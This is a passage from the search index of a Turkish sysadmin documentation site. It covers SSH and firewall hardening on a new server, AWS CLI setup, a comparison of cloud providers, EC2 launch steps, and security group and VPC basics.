girmeli."},{"location":"checklists/server-first-setup/#2-ssh-hardening-kritik","title":"2. SSH Hardening (Kritik) \ud83d\udd12","text":"<p>Dosya: <code>/etc/ssh/sshd_config</code></p> <p>| Parametre                | De\u011fer  | Neden?                               | Do\u011frulama                                                                        | | :----------------------- | :----- | :----------------------------------- | :------------------------------------------------------------------------------- | --------------------------------- | | <code>PermitRootLogin</code>        | <code>no</code>   | Root brute-force engellemek i\u00e7in.    | <code>ssh root@&lt;IP&gt;</code> -&gt; Permission denied d\u00f6nmeli.                                | | <code>PasswordAuthentication</code> | <code>no</code>   | Sadece Key ile giri\u015f.                | <code>ssh -o PubkeyAuthentication=no deployer@&lt;IP&gt;</code> -&gt; Hata vermeli, \u015fifre sormamal\u0131. | | <code>PermitEmptyPasswords</code>   | <code>no</code>   | G\u00fcvenlik.                            | -                                                                                | | <code>Port</code>                   | <code>2222</code> | (Opsiyonel) Log kirlili\u011fini azalt\u0131r. | <code>netstat -tulpn                                                                  | grep sshd</code> yeni portu g\u00f6stermeli. |</p> <p>Not: De\u011fi\u015fiklikten sonra <code>sshd -t</code> (Test Config) yapmadan servisi restart etmeyin!</p>"},{"location":"checklists/server-first-setup/#3-firewall-ufw","title":"3. Firewall (UFW) \ud83e\uddf1","text":"<p>Kural: Default Deny Incoming.</p> <pre><code># Kurulum\napt install ufw\nufw default deny incoming\nufw default allow outgoing\n\n# \u0130zinler\nufw allow ssh  # Veya port 2222\nufw allow 80/tcp\nufw allow 443/tcp\n\n# Aktifle\u015ftir\nufw enable\n</code></pre> <p>\u2705 Verify Step:</p> <pre><code>ufw status verbose\n# \u00c7\u0131kt\u0131: \"Status: active\" ve \"Default: deny (incoming)\" OLMALIDIR.\n</code></pre>"},{"location":"checklists/server-first-setup/#4-system-hardening","title":"4. System Hardening \u2699\ufe0f","text":"Ayar Dosya/Komut Verify Timezone <code>timedatectl set-timezone Europe/Istanbul</code> <code>date</code> komutu do\u011fru saati g\u00f6stermeli. Swapiness <code>/etc/sysctl.conf</code> -&gt; <code>vm.swappiness=10</code> <code>cat /proc/sys/vm/swappiness</code> -&gt; 10 olmal\u0131. TCP BBR <code>net.core.default_qdisc=fq</code> + <code>net.ipv4.tcp_congestion_control=bbr</code> <code>sysctl net.ipv4.tcp_congestion_control</code> -&gt; bbr olmal\u0131. Auto Update <code>apt install unattended-upgrades</code> <code>systemctl status unattended-upgrades</code> -&gt; Active olmal\u0131. Fail2Ban <code>apt install fail2ban</code> <code>fail2ban-client status sshd</code> -&gt; Hapisteki (Jail) IP'leri g\u00f6stermeli."},{"location":"checklists/server-first-setup/#5-final-smoke-test","title":"5. Final Smoke Test \ud83d\udeac","text":"<ol> <li>Sunucuya <code>reboot</code> at\u0131n.</li> <li>Bilgisayar\u0131n\u0131zdan <code>ping</code> at\u0131n (A\u00e7\u0131ld\u0131 m\u0131?).</li> <li><code>ssh deployer@&lt;IP&gt;</code> ile ba\u011flan\u0131n.</li> <li><code>sudo docker ps</code> \u00e7al\u0131\u015ft\u0131r\u0131n (Hata vermemeli).</li> </ol>"},{"location":"cloud/aws/cli/","title":"AWS CLI (Command Line Interface)","text":"<p>AWS'yi web aray\u00fcz\u00fcnden y\u00f6netmek (Console) yava\u015f kalabilir. AWS CLI, sunucular\u0131n\u0131z\u0131 (EC2), depolama alanlar\u0131n\u0131z\u0131 (S3) ve a\u011f ayarlar\u0131n\u0131z\u0131 terminalden h\u0131zl\u0131ca y\u00f6netmenizi sa\u011flar.</p>"},{"location":"cloud/aws/cli/#1-kurulum-linuxubuntu","title":"1. Kurulum (Linux/Ubuntu)","text":"<p>Resmi AWS CLI v2 kurulumu i\u00e7in a\u015fa\u011f\u0131daki ad\u0131mlar\u0131 takip edin:</p> <pre><code># Gerekli ara\u00e7lar\u0131 kurun (unzip)\nsudo apt update &amp;&amp; sudo apt install -y unzip curl\n\n# Kurulum paketini indirin\ncurl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\"\n\n# Paketi a\u00e7\u0131n ve kurun\nunzip awscliv2.zip\nsudo ./aws/install\n</code></pre> <p>Kurulumun ba\u015far\u0131l\u0131 oldu\u011funu do\u011frulay\u0131n:</p> <pre><code>aws --version\n# aws-cli/2.x.x ... \u00e7\u0131kt\u0131s\u0131n\u0131 g\u00f6rmelisiniz.\n</code></pre>"},{"location":"cloud/aws/cli/#2-kimlik-ayarlar-configuration","title":"2. Kimlik Ayarlar\u0131 (Configuration)","text":"<p>AWS CLI'\u0131n hesab\u0131n\u0131za eri\u015febilmesi i\u00e7in \u00f6nce IAM (Identity and Access Management) \u00fczerinden bir \"Access Key\" olu\u015fturmal\u0131s\u0131n\u0131z.</p>"},{"location":"cloud/aws/cli/#a-aws-console-uzerinden-key-alma","title":"A. AWS Console \u00dczerinden Key Alma","text":"<ol> <li>IAM &gt; Users men\u00fcs\u00fcne gidin.</li> <li>Bir kullan\u0131c\u0131 olu\u015fturun (\u00f6rn: <code>developer</code>).</li> <li>Kullan\u0131c\u0131 detaylar\u0131nda Security credentials sekmesine gelin.</li> <li>Access keys b\u00f6l\u00fcm\u00fcnden \"Create access key\" deyin.</li> <li>\"Command Line Interface (CLI)\" se\u00e7ene\u011fini se\u00e7in.</li> <li>Size verilen Access Key ID ve Secret Access Key'i g\u00fcvenli bir yere kaydedin.</li> </ol>"},{"location":"cloud/aws/cli/#b-cli-yaplandrmas","title":"B. CLI Yap\u0131land\u0131rmas\u0131","text":"<p>Terminalinize d\u00f6n\u00fcn ve \u015fu komutu \u00e7al\u0131\u015ft\u0131r\u0131n:</p> <pre><code>aws configure\n</code></pre> <p>S\u0131ras\u0131yla \u015funlar\u0131 girin:</p> <ul> <li>AWS Access Key ID: (Panelden ald\u0131\u011f\u0131n\u0131z)</li> <li>AWS Secret Access Key: (Panelden ald\u0131\u011f\u0131n\u0131z)</li> <li>Default region name: (\u00d6rn: <code>eu-central-1</code>)</li> <li>Default output format: <code>json</code> (veya tablo isterseniz <code>table</code>)</li> </ul>"},{"location":"cloud/aws/cli/#3-pratik-komutlar","title":"3. Pratik Komutlar","text":""},{"location":"cloud/aws/cli/#sunucular-listeleme-ec2","title":"Sunucular\u0131 Listeleme (EC2)","text":"<p>T\u00fcm \u00e7al\u0131\u015fan sunucular\u0131n\u0131z\u0131n isimlerini ve IP'lerini tablo \u015feklinde g\u00f6r\u00fcn:</p> <pre><code>aws ec2 describe-instances --query 'Reservations[*].Instances[*].{Name:Tags[?Key==`Name`].Value | [0], State:State.Name, PublicIP:PublicIpAddress}' --output table\n</code></pre>"},{"location":"cloud/aws/cli/#s3-dosya-yonetimi","title":"S3 Dosya Y\u00f6netimi","text":"<p>Bir dosyay\u0131 buluta y\u00fcklemek veya indirmek i\u00e7in:</p> <pre><code># Bucket olu\u015fturma\naws s3 mb s3://benim-ozel-yedek-klasorum\n\n# Dosya y\u00fckleme\naws s3 cp yedek.tar.gz s3://benim-ozel-yedek-klasorum/\n</code></pre>"},{"location":"cloud/aws/cli/#sunucu-durdurmabaslatma","title":"Sunucu Durdurma/Ba\u015flatma","text":"<pre><code># Instance ID'sini kullanarak\naws ec2 stop-instances --instance-ids i-0123456789abcdef0\n</code></pre>"},{"location":"cloud/aws/cli/#4-oci-cli-vs-aws-cli-karslastrmas","title":"4. OCI CLI vs AWS CLI Kar\u015f\u0131la\u015ft\u0131rmas\u0131","text":"\u00d6zellik AWS CLI OCI CLI Kimlik Do\u011frulama Access Key / Secret Key API RSA Keypair (Config setup) S\u00f6zdizimi <code>aws &lt;servis&gt; &lt;aksiyon&gt;</code> <code>oci &lt;servis&gt; &lt;aksiyon&gt;</code> Pop\u00fclerlik \u00c7ok y\u00fcksek, topluluk deste\u011fi bol. Kurumsal, spesifik kullan\u0131m. <p>[!TIP] &gt; Profil Y\u00f6netimi: E\u011fer birden fazla AWS hesab\u0131n\u0131z varsa <code>aws configure --profile is-hesabi</code> diyerek farkl\u0131 profiller olu\u015fturabilir ve komutlar\u0131n sonuna <code>--profile is-hesabi</code> ekleyerek kullanabilirsiniz.</p>"},{"location":"cloud/aws/concepts/","title":"Bulut Temelleri ve Kar\u015f\u0131la\u015ft\u0131rma","text":"<p>Farkl\u0131 bulut sa\u011flay\u0131c\u0131lar\u0131 (AWS, Oracle, Google, Yandex) ayn\u0131 temel teknolojileri farkl\u0131 isimlerle pazarlar. Bu b\u00f6l\u00fcm, \"bulut dilini\" \u00e7\u00f6zmenize ve platformlar aras\u0131 ge\u00e7i\u015f yapman\u0131za yard\u0131mc\u0131 olur.</p>"},{"location":"cloud/aws/concepts/#1-bulut-terimleri-sozlugu-mapping","title":"1. Bulut Terimleri S\u00f6zl\u00fc\u011f\u00fc (Mapping)","text":"<p>Bulut d\u00fcnyas\u0131nda her \u015fey temelde bir sunucu, bir disk ve bir a\u011f kablosudur. \u0130\u015fte devlerin isimlendirmeleri:</p> \u00d6zellik AWS Oracle (OCI) Google (GCP) Azure DigitalOcean Hetzner OVHcloud Sanal Sunucu EC2 Compute Instance Compute Engine Virtual Machines Droplets Cloud Server Public Cloud \u00d6zel Sanal A\u011f VPC VCN VPC Network VNet VPC Network vRack Disk (Blok) EBS Block Volume Persistent Disk Managed Disks Block Storage Volumes Block Storage Obje Depolama S3 Object Storage Cloud Storage Blob Storage Spaces - Object Storage G\u00fcvenlik Duvar\u0131 Security Group Security List / NSG Firewalls NSG Cloud Firewalls Firewalls Security Groups Sabit IP Elastic IP Reserved Public IP Static IP Static Public IP Reserved IP Floating IP Public IP"},{"location":"cloud/aws/concepts/#2-neden-birden-fazla-saglayc-multi-cloud","title":"2. Neden Birden Fazla Sa\u011flay\u0131c\u0131? (Multi-Cloud)","text":"<p>Tek bir yere ba\u011fl\u0131 kalmak yerine (Vendor Lock-in), her sa\u011flay\u0131c\u0131n\u0131n en iyi/ucuz yan\u0131n\u0131 kullanmak mant\u0131kl\u0131d\u0131r.</p>"},{"location":"cloud/aws/concepts/#oracle-cloud","title":"Oracle Cloud","text":"<ul> <li>Art\u0131s\u0131: \"Always Free\" paketi rakipsizdir (ARM sunucular + 200GB disk bedava).</li> <li>Eksisi: UI biraz karma\u015f\u0131k olabilir, global ekosistemi AWS kadar b\u00fcy\u00fck de\u011fildir.</li> </ul>"},{"location":"cloud/aws/concepts/#aws-amazon-web-services","title":"AWS (Amazon Web Services)","text":"<ul> <li>Art\u0131s\u0131: End\u00fcstri standard\u0131d\u0131r. Her d\u00f6k\u00fcman AWS ile ba\u015flar. Kredi (Credit) almak daha kolayd\u0131r.</li> <li>Eksisi: \"Egress\" (d\u0131\u015far\u0131 giden trafik) fiyatland\u0131rmas\u0131 s\u00fcrprizler yaratabilir.</li> </ul>"},{"location":"cloud/aws/concepts/#google-cloud-gcp","title":"Google Cloud (GCP)","text":"<ul> <li>Art\u0131s\u0131: Global a\u011f\u0131 \u00e7ok h\u0131zl\u0131d\u0131r (Youtube altyap\u0131s\u0131). Kubernetes (GKE) i\u00e7in en iyisidir.</li> <li>Eksisi: Servisleri \u00e7ok h\u0131zl\u0131 \u00f6ld\u00fcrebiliyorlar (deprecate) ve aray\u00fcz\u00fc \u00e7ok kalabal\u0131k.</li> </ul>"},{"location":"cloud/aws/concepts/#yandex-cloud","title":"Yandex Cloud","text":"<ul> <li>Art\u0131s\u0131: Yerel b\u00f6lgelerde (\u00d6rn: Rusya, Kazakistan vb.) \u00e7ok h\u0131zl\u0131d\u0131r. Kullan\u0131m kolayl\u0131\u011f\u0131 AWS'ye yak\u0131nd\u0131r.</li> <li>Eksisi: Global varl\u0131\u011f\u0131 s\u0131n\u0131rl\u0131d\u0131r, baz\u0131 ileri d\u00fczey servisleri (Managed DB vb.) di\u011fer devler kadar olgun olmayabilir.</li> </ul>"},{"location":"cloud/aws/concepts/#microsoft-azure","title":"Microsoft Azure","text":"<ul> <li>Art\u0131s\u0131: Kurumsal \u015firketlerin (Active Directory, Office 365) merkezidir. Hibrit bulut i\u00e7in en g\u00fc\u00e7l\u00fcs\u00fcd\u00fcr.</li> <li>Eksisi: Aray\u00fcz\u00fc (Portal) bazen \u00e7ok yava\u015f ve karma\u015f\u0131k olabilir.</li> </ul>"},{"location":"cloud/aws/concepts/#digitalocean-linode-akamai","title":"DigitalOcean &amp; Linode (Akamai)","text":"<ul> <li>Art\u0131s\u0131: \"Developer-First\". Sadelik ve sabit fiyatland\u0131rma (Droplets). Karma\u015fa s\u0131f\u0131ra yak\u0131nd\u0131r.</li> <li>Eksisi: Kurumsal \u00f6l\u00e7ekte (\u00e7ok karma\u015f\u0131k networking) k\u0131s\u0131tl\u0131 kalabilir.</li> </ul>"},{"location":"cloud/aws/concepts/#hetzner-cloud","title":"Hetzner Cloud","text":"<ul> <li>Art\u0131s\u0131: Fiyat/Performans kral\u0131d\u0131r. Avrupa (Almanya/Finlandiya) lokasyonlu, \u00e7ok ucuz ve \u00e7ok h\u0131zl\u0131 sunucular verir.</li> <li>Eksisi: Global yay\u0131l\u0131m\u0131 (ABD hari\u00e7) azd\u0131r, sadece temel servisleri sa\u011flar.</li> </ul>"},{"location":"cloud/aws/concepts/#ovhcloud-scaleway","title":"OVHcloud &amp; Scaleway","text":"<ul> <li>Art\u0131s\u0131: Avrupa'n\u0131n en b\u00fcy\u00fckleridir. Veri gizlili\u011fi (GDPR) odakl\u0131d\u0131rlar. OVH'nin \"Bare Metal\" sunucular\u0131 me\u015fhurdur.</li> <li>Eksisi: Aray\u00fczleri AWS/GCP kadar ak\u0131c\u0131 de\u011fildir.</li> </ul>"},{"location":"cloud/aws/concepts/#alibaba-cloud","title":"Alibaba Cloud","text":"<ul> <li>Art\u0131s\u0131: Asya pazar\u0131n\u0131n lideridir. AWS'ye \u00e7ok benzer bir ekosistemi vard\u0131r.</li> <li>Eksisi: Bat\u0131l\u0131 kullan\u0131c\u0131lar i\u00e7in d\u00f6k\u00fcmantasyon ve destek bazen zay\u0131f kalabilir.</li> </ul>"},{"location":"cloud/aws/concepts/#3-temel-kavramlar","title":"3. Temel Kavramlar","text":""},{"location":"cloud/aws/concepts/#region-vs-availability-zone-az","title":"Region vs. Availability Zone (AZ)","text":"<ul> <li>Region (B\u00f6lge): Fiziksel bir \u015fehir/\u00fclke (\u00d6rn: <code>eu-central-1</code> / Frankfurt).</li> <li>AZ / AD (Kullan\u0131labilirlik B\u00f6lgesi): Bir Region i\u00e7indeki, birbirinden ba\u011f\u0131ms\u0131z \u00e7al\u0131\u015fan veri merkezleri. Bir AD su alt\u0131nda kalsa bile di\u011feri \u00e7al\u0131\u015fmaya devam eder.</li> </ul>"},{"location":"cloud/aws/concepts/#iaas-vs-paas-vs-saas","title":"IaaS vs. PaaS vs. SaaS","text":"<ul> <li>IaaS (Altyap\u0131): Bo\u015f sunucu al\u0131rs\u0131n\u0131z, her \u015feyi siz kurars\u0131n\u0131z (EC2, OCI Compute). Bizim rehberimiz buna odaklan\u0131r.</li> <li>PaaS (Platform): Sunucuyu g\u00f6rmezsiniz, sadece kodunuzu atars\u0131n\u0131z (Heroku, AWS Lambda).</li> <li>SaaS (Yaz\u0131l\u0131m): Direkt bir hizmeti kullan\u0131rs\u0131n\u0131z (Google Drive, Slack).</li> </ul>"},{"location":"cloud/aws/concepts/#4-kritik-fark-always-free-vs-cloud-credits","title":"4. Kritik Fark: \"Always Free\" vs. \"Cloud Credits\"","text":"<ul> <li>Oracle Always Free: Sunucu sonsuza kadar \u00fccretsizdir (siz silmedik\u00e7e). Prototip ve ki\u015fisel bloglar i\u00e7in idealdir.</li> <li>AWS Credits: Hesab\u0131n\u0131za \u00f6rn. 1000$ tan\u0131mlan\u0131r. Bu para bitene kadar veya s\u00fcresi (genelde 1-2 y\u0131l) dolana kadar \u00fccretsiz kullan\u0131rs\u0131n\u0131z. Para bitince fatura gelmeye ba\u015flar.</li> </ul> <p>[!TIP] &gt; Strateji: Daimi \u00e7al\u0131\u015fan k\u00fc\u00e7\u00fck servisleri Oracle Always Free'de, y\u00fcksek performans gerektiren veya krediniz varken maliyetli olan i\u015fleri AWS'de tutmak en mant\u0131kl\u0131 harekettir.</p>"},{"location":"cloud/aws/ec2/","title":"AWS EC2: Detayl\u0131 Sunucu Kurulum Rehberi","text":"<p>AWS'de sunucu (EC2) a\u00e7mak, y\u00fczlerce se\u00e7enek y\u00fcz\u00fcnden karma\u015f\u0131k g\u00f6r\u00fcnebilir. Bu rehber, sadece ihtiyac\u0131n\u0131z olan ayarlara odaklanarak g\u00fcvenli ve \u00fccretsiz/ucuz bir ba\u015flang\u0131\u00e7 yapman\u0131z\u0131 sa\u011flar.</p>"},{"location":"cloud/aws/ec2/#0-maliyet-ve-free-tier-mantg-surpriz-fatura-yeme","title":"0. Maliyet ve Free Tier Mant\u0131\u011f\u0131 (S\u00fcrpriz Fatura Yeme!)","text":"<p>Makineyi a\u00e7madan \u00f6nce c\u00fczdan\u0131m\u0131z\u0131 koruyal\u0131m:</p> <ol> <li>750 Saat Kural\u0131: Yeni hesaplar i\u00e7in ilk 12 ay, ayl\u0131k 750 saat <code>t2.micro</code> veya <code>t3.micro</code> \u00fccretsizdir.<ul> <li>1 Sunucu = 24 saat x 31 g\u00fcn = 744 saat (Tamamen \u00fccretsiz).</li> <li>2 Sunucu = Ay\u0131n yar\u0131s\u0131nda \u00fccretsiz kotan\u0131z dolar, sonraki g\u00fcnler \u00fccret yazar.</li> </ul> </li> <li>B\u00f6lge (Region) \u00d6nemlidir: Her zaman <code>us-east-1</code> (N. Virginia), <code>us-east-2</code> (Ohio), <code>eu-central-1</code> (Frankfurt) gibi ucuz ve pop\u00fcler b\u00f6lgeleri se\u00e7in. Baz\u0131 b\u00f6lgelerde (\u00f6rn: Sao Paulo) fiyatlar daha y\u00fcksektir.</li> </ol>"},{"location":"cloud/aws/ec2/#1-launch-instance-adm-adm","title":"1. Launch Instance (Ad\u0131m Ad\u0131m)","text":"<p>EC2 Dashboard &gt; Launch Instances butonuna bas\u0131n. Kar\u015f\u0131n\u0131za uzun bir form gelecek. \u0130\u015fte b\u00f6l\u00fcm b\u00f6l\u00fcm yapman\u0131z gerekenler:</p>"},{"location":"cloud/aws/ec2/#a-name-and-tags-isim","title":"A. Name and Tags (\u0130sim)","text":"<ul> <li>Name: Sunucuyu tan\u0131man\u0131z i\u00e7in bir isim verin. (\u00d6rn: <code>Project-Main-Server</code>)</li> </ul>"},{"location":"cloud/aws/ec2/#b-application-and-os-images-isletim-sistemi","title":"B. Application and OS Images (\u0130\u015fletim Sistemi)","text":"<ul> <li>Se\u00e7im: Ubuntu kutusuna t\u0131klay\u0131n.</li> <li>AMI: <code>Ubuntu Server 24.04 LTS (HVM), SSD Volume Type</code> se\u00e7ili oldu\u011fundan emin olun.</li> <li>Architecture: <code>64-bit (x86)</code> se\u00e7in. (ARM se\u00e7meyin, bir\u00e7ok paket uyumsuzluk \u00e7\u0131karabilir).</li> </ul>"},{"location":"cloud/aws/ec2/#c-instance-type-guc","title":"C. Instance Type (G\u00fc\u00e7)","text":"<ul> <li>Se\u00e7im: <code>t2.micro</code> veya <code>t3.micro</code>.</li> <li>Kontrol: Yan\u0131nda ye\u015fil renkte Free tier eligible yaz\u0131s\u0131n\u0131 mutlaka g\u00f6r\u00fcn.</li> </ul>"},{"location":"cloud/aws/ec2/#d-key-pair-login-anahtar","title":"D. Key Pair (Login Anahtar\u0131)","text":"<p>Buras\u0131 sunucunun kap\u0131 anahtar\u0131d\u0131r. \u015eifre yerine dosya kullan\u0131r\u0131z.</p> <ul> <li>Create new key pair linkine t\u0131klay\u0131n.</li> <li>Name: <code>aws-2026-key</code> (\u0130sim verin).</li> <li>Key pair type: <code>ED25519</code> (Daha modern ve k\u0131sa) veya <code>RSA</code> (Eski ama her yerde \u00e7al\u0131\u015f\u0131r).</li> <li>Format: <code>.pem</code> (Mac/Linux i\u00e7in) veya <code>.ppk</code> (Windows PuTTY i\u00e7in).</li> <li>Create key pair butonuna bas\u0131n ve inen dosyay\u0131 ASLA S\u0130LMEY\u0130N.</li> </ul>"},{"location":"cloud/aws/ec2/#e-network-settings-ag-ayarlar","title":"E. Network Settings (A\u011f Ayarlar\u0131)","text":"<ul> <li>VPC / Subnet: Varsay\u0131lan (Default) ayarlarda b\u0131rak\u0131n. AWS sizin i\u00e7in ayarlam\u0131\u015ft\u0131r.</li> <li>Auto-assign Public IP: Enable oldu\u011fundan emin olun. Yoksa sunucuya internetten eri\u015femezsiniz.</li> <li>Firewall (Security Groups):</li> <li><code>Create security group</code> se\u00e7in.</li> <li>SSH (22): Source k\u0131sm\u0131n\u0131 <code>Anywhere</code> yerine <code>My IP</code> yap\u0131n. (Sadece sizin evinizden eri\u015filsin).</li> <li>HTTP (80) / HTTPS (443): \"Allow HTTP traffic from the internet\" kutucuklar\u0131n\u0131 i\u015faretleyin.</li> </ul>"},{"location":"cloud/aws/ec2/#f-configure-storage-disk","title":"F. Configure Storage (Disk)","text":"<p>AWS Free Tier, 30GB'a kadar EBS depolama verir. Varsay\u0131lan genelde 8GB gelir.</p> <ul> <li>Boyut: <code>8</code> yerine <code>30</code> Gb yapabilirsiniz (Tek sunucu olacaksa).</li> <li>Volume Type: <code>gp3</code> se\u00e7in. (Daha ucuz ve performansl\u0131d\u0131r).</li> <li>Delete on termination: <code>Yes</code> (Varsay\u0131lan). Sunucuyu silerseniz diski de siler, \u00e7\u00f6p b\u0131rakmaz.</li> </ul>"},{"location":"cloud/aws/ec2/#2-advanced-details-ileri-duzey-ayarlar","title":"2. Advanced Details (\u0130leri D\u00fczey Ayarlar)","text":"<p>\u00c7o\u011fu kullan\u0131c\u0131 buray\u0131 kafas\u0131 kar\u0131\u015f\u0131p kapat\u0131r, ama \u00f6nemli iki ayar vard\u0131r:</p>"},{"location":"cloud/aws/ec2/#a-iam-instance-profile-kimlik-rolu","title":"A. IAM Instance Profile (Kimlik Rol\u00fc)","text":"<p>Soru: Bunu se\u00e7mek zorunda m\u0131y\u0131m? Cevap: %90 Hay\u0131r. Basit bir web sunucusu i\u00e7in (Nginx, Docker vb.) gerekmez.</p> <p>Ne zaman gerekir? E\u011fer sunucunuzun i\u00e7inden <code>aws s3 cp yedek.zip s3://bucketim</code> gibi komutlarla AWS servislerini kullanacaksan\u0131z gerekir.</p> <ul> <li>E\u011fer yoksa bo\u015f b\u0131rak\u0131n. Sonradan da eklenebilir.</li> </ul>"},{"location":"cloud/aws/ec2/#b-user-data-otomatik-kurulum-scripti","title":"B. User Data (Otomatik Kurulum scripti)","text":"<p>Sunucu ilk a\u00e7\u0131ld\u0131\u011f\u0131 an (daha siz ba\u011flanmadan) \u00e7al\u0131\u015facak komutlard\u0131r. Buraya update komutlar\u0131n\u0131 yazmak zaman kazand\u0131r\u0131r:</p> <pre><code>#!/bin/bash\napt update &amp;&amp; apt upgrade -y\napt install -y docker.io docker-compose\nusermod -aG docker ubuntu\n</code></pre>"},{"location":"cloud/aws/ec2/#3-baglant-ve-son-kontroller","title":"3. Ba\u011flant\u0131 ve Son Kontroller","text":"<p>Launch Instance butonuna bast\u0131ktan 1-2 dakika sonra sunucu <code>Running</code> durumuna ge\u00e7er.</p> <p>Ba\u011flanmak i\u00e7in (Terminal):</p> <pre><code># Anahtara izin ver (Sadece ilk sefer)\nchmod 400 aws-2026-key.pem\n\n# Ba\u011flan\nssh -i \"aws-2026-key.pem\" ubuntu@SUNUCU-PUBLIC-IP\n</code></pre> <p>[!TIP] &gt; Sabit IP (Elastic IP): Sunucuyu kapat\u0131p a\u00e7arsan\u0131z IP de\u011fi\u015fir. \u00dcretim ortam\u0131 (Production) i\u00e7in mutlaka Elastic IP al\u0131p sunucuya ba\u011flay\u0131n. (Sunucu a\u00e7\u0131kken Elastic IP \u00fccretsizdir).</p>"},{"location":"cloud/aws/networking/","title":"AWS A\u011f Mimarisi ve G\u00fcvenlik Sunucu Kap\u0131lar\u0131","text":"<p>AWS'de a\u011f g\u00fcvenli\u011fi, sunucunun i\u00e7indeki UFW'den \u00f6nce daha d\u0131\u015f bir katmanda, Security Group (SG) seviyesinde ba\u015flar.</p>"},{"location":"cloud/aws/networking/#1-security-group-guvenlik-grubu-nedir","title":"1. Security Group (G\u00fcvenlik Grubu) Nedir?","text":"<p>Security Group, sunucunuzun \u00f6n\u00fcne konan sanal bir a\u011f duvar\u0131d\u0131r. Oracle'daki Security List veya Network Security Group (NSG) ile neredeyse ayn\u0131d\u0131r.</p>"},{"location":"cloud/aws/networking/#temel-ozellikler","title":"Temel \u00d6zellikler","text":"<ul> <li>Stateful (Durumlu): Bir porttan girmeye izin verirseniz, o ba\u011flant\u0131n\u0131n cevab\u0131 i\u00e7in otomatik olarak \u00e7\u0131k\u0131\u015f izni verilir. (UFW'de de genellikle b\u00f6yledir).</li> <li>Whitelist Mant\u0131\u011f\u0131: Varsay\u0131lan olarak her \u015fey kapal\u0131d\u0131r. Sadece sizin ekledi\u011finiz kurallar ge\u00e7ebilir.</li> </ul>"},{"location":"cloud/aws/networking/#2-inbound-giris-kurallar","title":"2. Inbound (Giri\u015f) Kurallar\u0131","text":"<p>Sunucunuza hangi portlardan kimler gelebilir?</p> Protokol Port Kaynak (Source) A\u00e7\u0131klama Custom TCP <code>2222</code> <code>My IP</code> G\u00fcvenli SSH Eri\u015fimi (Bizim ayar\u0131m\u0131z) HTTPS <code>443</code> <code>0.0.0.0/0</code> Web trafi\u011fi (T\u00fcm d\u00fcnya) HTTP <code>80</code> <code>0.0.0.0/0</code> Web trafi\u011fi (T\u00fcm d\u00fcnya) <p>[!IMPORTANT] &gt; Neden UFW Varken SG Kullan\u0131yoruz? G\u00fcvenlik katmanl\u0131 olmal\u0131d\u0131r (Defense in Depth). SG, k\u00f6t\u00fc niyetli trafi\u011fi daha sunucunuzun CPU'su ve Network kart\u0131 yorulmadan bulut seviyesinde engeller.</p>"},{"location":"cloud/aws/networking/#3-outbound-cks-kurallar","title":"3. Outbound (\u00c7\u0131k\u0131\u015f) Kurallar\u0131","text":"<p>Sunucunuz d\u0131\u015far\u0131ya nereye gidebilir?</p> <ul> <li>AWS'de varsay\u0131lan olarak \"All Traffic (0.0.0.0/0)\" a\u00e7\u0131kt\u0131r.</li> <li>E\u011fer Firewall (UFW) Rehberimizde yapt\u0131\u011f\u0131m\u0131z gibi \"\u00e7\u0131k\u0131\u015f\u0131 da kapatmak\" (egress filtering) istiyorsan\u0131z, AWS SG \u00fczerinde de bu kurallar\u0131 daraltabilirsiniz. Ancak genellikle varsay\u0131lan\u0131n a\u00e7\u0131k kalmas\u0131, g\u00fcncellemelerin (apt get update) sorunsuz \u00e7al\u0131\u015fmas\u0131 i\u00e7in b\u0131rak\u0131l\u0131r.</li> </ul>"},{"location":"cloud/aws/networking/#4-vpc-virtual-private-cloud-temelleri","title":"4. VPC (Virtual Private Cloud) Temelleri","text":"<p>AWS'de her \u015fey bir VPC i\u00e7indedir. Bu, sizin buluttaki izole edilmi\u015f \u00f6zel a\u011f\u0131n\u0131zd\u0131r.</p> <ul> <li>Subnet: VPC i\u00e7indeki alt a\u011flar. Sunucular genelde bir Public Subnet i\u00e7inde bulunur.</li> <li>Internet Gateway (IGW): Subnet'inizin internete \u00e7\u0131kmas\u0131n\u0131 sa\u011flayan kap\u0131. AWS bunu sizin i\u00e7in otomatik ayarlar ama silerseniz sunucuya eri\u015femezsiniz.</li> </ul>"},{"location":"cloud/aws/networking/#5-pratik-uygulama-2222-portunu-acmak","title":"5. Pratik Uygulama: 2222 Portunu A\u00e7mak","text":"<p>E\u011fer bu rehberi takip ederek SSH portunuzu 2222 yapt\u0131ysan\u0131z, AWS taraf\u0131nda da \u015fu ayar\u0131 yapmal\u0131s\u0131n\u0131z:</p> <ol> <li>EC2 sayfas\u0131nda sunucunuzu se\u00e7in.</li> <li>Alt sekmelerden Security &gt; Security Groups'a t\u0131klay\u0131n.</li> <li>Inbound Rules &gt; Edit Inbound Rules butonuna bas\u0131n.</li> <li>Add Rule diyerek:</li> <li>Type: <code>Custom TCP</code></li> <li>Port Range: <code>2222</code></li> <li>Source: <code>My IP</code> (Kendi g\u00fcvenli\u011finiz i\u00e7in)</li> <li>Save Rules diyerek kaydedin.</li> </ol> <p>[!TIP] &gt; Test: E\u011fer hem SG'de portu a\u00e7t\u0131n\u0131z hem sunucuda <code>ufw allow 2222/tcp</code> yapt\u0131n\u0131z ama hala giremiyorsan\u0131z, sunucudaki SSH servisinin (<code>sshd</code>) ger\u00e7ekten o portu dinledi\u011finden emin olun: <code>sudo ss -lntp | grep 2222</code></p>"},{"location":"cloud/aws/storage/","title":"AWS EBS: Esnek Blok Depolama","text":"<p>AWS'de ek disk ihtiyac\u0131n\u0131z\u0131 kar\u015f\u0131layan servise EBS (Elastic Block Store) denir. Oracle'daki Block Volume ile mant\u0131k olarak tamamen ayn\u0131d\u0131r.</p>"},{"location":"cloud/aws/storage/#1-ebs-vs-oracle-block-volume","title":"1. EBS vs. Oracle Block Volume","text":"\u00d6zellik AWS EBS Oracle Block Volume Ba\u011flant\u0131 Tipi Native (EBS bus) iSCSI / Paravirtualized Performans IOPS bazl\u0131 (gp3 \u00f6nerilir) VPU (Performance Units) bazl\u0131 Sunucuya Takma Console'dan \"Attach\" iSCSI komutlar\u0131 + Console <p>[!TIP] &gt; AWS gp3 Avantaj\u0131: gp3 disk tipi, gp2'ye g\u00f6re daha ucuzdur ve performans\u0131n\u0131 disk boyutundan ba\u011f\u0131ms\u0131z olarak ayarlaman\u0131za izin verir. Yeni disk a\u00e7arken gp3 se\u00e7ti\u011finizden emin olun.</p>"},{"location":"cloud/aws/storage/#2-disk-olusturma-ve-takma","title":"2. Disk Olu\u015fturma ve Takma","text":"<ol> <li>AWS Console &gt; EC2 &gt; Elastic Block Store &gt; Volumes 